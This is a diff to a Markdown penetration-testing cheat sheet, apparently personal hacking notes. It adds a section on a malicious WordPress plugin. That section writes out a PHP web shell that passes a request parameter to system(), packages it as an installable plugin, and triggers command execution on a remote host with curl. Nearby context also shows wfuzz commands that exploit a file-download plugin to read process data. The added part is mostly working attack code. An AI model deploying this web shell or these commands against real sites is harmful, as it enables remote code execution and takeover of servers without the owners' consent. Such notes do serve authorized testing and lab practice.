@@ -92,6 +92,7 @@ Thank you for reading.
 		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
 		- [Upload Vulnerabilities](#upload-vulnerabilities)
 		- [wfuzz](#wfuzz)
+		- [WordPress](#wordpress)
 		- [WPProbe](#wpprobe)
 		- [WPScan](#wpscan)
 		- [XML External Entity (XXE)](#xml-external-entity-xxe)
@@ -2516,6 +2517,35 @@ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 ht
 
 ```shell
 wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
+```
+
+#### WordPress
+
+##### Malicious Wordpress Plugin
+
+```shell
+mkdir shell-plugin/
+```
+
+```shell
+cat > shell-plugin/shell-plugin.php <<'EOF'
+<?php
+/*
+Plugin Name: Shell Plugin
+Version: 1.0
+*/
+if (isset($_REQUEST['c'])) {
+    system($_REQUEST['c']);
+}
+EOF
+```
+
+```shell
+zip -r shell-plugin.zip shell-plugin
+```
+
+```shell
+curl -sk 'http://<RHOST>/wp-content/plugins/shell-plugin/shell-plugin.php?c=id'
 ```
 
 #### WPProbe
